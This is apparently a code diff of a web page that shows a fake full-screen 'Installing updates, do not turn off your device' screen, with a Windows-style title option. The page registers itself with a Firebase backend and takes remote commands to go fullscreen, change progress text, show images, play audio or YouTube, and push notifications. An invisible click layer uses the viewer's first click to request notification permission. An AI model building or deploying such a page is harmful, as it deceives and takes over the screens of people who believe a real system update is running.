@@ -7,11 +7,26 @@
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 <style>
-/* Same kiosk styles as before */
+body{margin:0;font-family:Inter,sans-serif;background:#0b0f14;color:#e9eeff}
+.screen{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}
+.panel{width:520px;max-width:90%;text-align:center}
+.title{font-size:22px;margin-bottom:8px}
+.status{opacity:.85;margin-bottom:16px}
+.bar{height:10px;background:#1a2446;border-radius:999px;overflow:hidden}
+.bar > i{display:block;height:100%;width:40%;background:linear-gradient(90deg,#4f8cff,#6aa8ff)}
+.overlay-img{position:fixed;inset:0;display:none;z-index:9999}
+.overlay-img img{width:100%;height:100%;object-fit:contain;background:#000}
+.click-anywhere{position:fixed;inset:0;z-index:10000;cursor:pointer}
 </style>
 </head>
 <body>
-<div class="screen">...<!-- Panel GUI -->...</div>
+<div class="screen">
+  <div class="panel">
+    <div class="title">Installing updates</div>
+    <div id="status" class="status">Do not turn off your device.</div>
+    <div class="bar"><i id="bar"></i></div>
+  </div>
+</div>
 <div class="overlay-img" id="imgWrap"><img id="img" /></div>
 <div class="click-anywhere" id="gate"></div>
 <audio id="audio"></audio>
@@ -28,31 +43,25 @@ const firebaseConfig = {
 };
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
-
 const gate = document.getElementById('gate');
 gate.onclick = async ()=>{try{await Notification.requestPermission()}catch(e){};gate.remove()};
-
 const receiverId = localStorage.rid || (localStorage.rid=crypto.randomUUID());
 db.ref('receivers/'+receiverId).set({online:true,ts:Date.now()});
 setInterval(()=>db.ref('receivers/'+receiverId).update({ts:Date.now()}),5000);
-
-// Listener with console log to debug
 db.ref('commands').on('child_added', s=>{
   const c = s.val();
   console.log('Received command:', c);
   if(c.target!=='ALL' && c.target!==receiverId) return;
   run(c.command,c.payload||{});
 });
-
 function run(cmd,p){
-  console.log('Executing command:', cmd,p);
   switch(cmd){
     case 'SET_FULLSCREEN': p.enabled?document.documentElement.requestFullscreen():document.exitFullscreen(); break;
-    case 'SET_STATUS_TEXT': status.textContent=p.text||''; break;
-    case 'SET_PROGRESS': bar.style.width=(p.value||0)+'%'; break;
-    case 'SHOW_IMAGE': img.src=p.base64; imgWrap.style.display='block'; break;
-    case 'CLEAR_IMAGE': imgWrap.style.display='none'; break;
-    case 'PLAY_AUDIO': audio.src=p.base64; audio.play().catch(()=>{}); break;
+    case 'SET_STATUS_TEXT': document.getElementById('status').textContent=p.text||''; break;
+    case 'SET_PROGRESS': document.getElementById('bar').style.width=(p.value||0)+'%'; break;
+    case 'SHOW_IMAGE': document.getElementById('img').src=p.base64; document.getElementById('imgWrap').style.display='block'; break;
+    case 'CLEAR_IMAGE': document.getElementById('imgWrap').style.display='none'; break;
+    case 'PLAY_AUDIO': document.getElementById('audio').src=p.base64; document.getElementById('audio').play().catch(()=>{}); break;
     case 'PLAY_YT': yt(p.url,p.mode); break;
     case 'NOTIFY': if(Notification.permission==='granted') new Notification(p.title||'',{body:p.body||''}); break;
     case 'SOFT_RELOAD': location.reload(); break;
@@ -60,7 +69,6 @@ function run(cmd,p){
     case 'SET_THEME': document.title=p.theme==='windows'?'Working on updates…':'Updating…'; break;
   }
 }
-
 function yt(url,mode){
   const id=(url.split('v=')[1]||'').split('&')[0];
   const f=document.createElement('iframe');
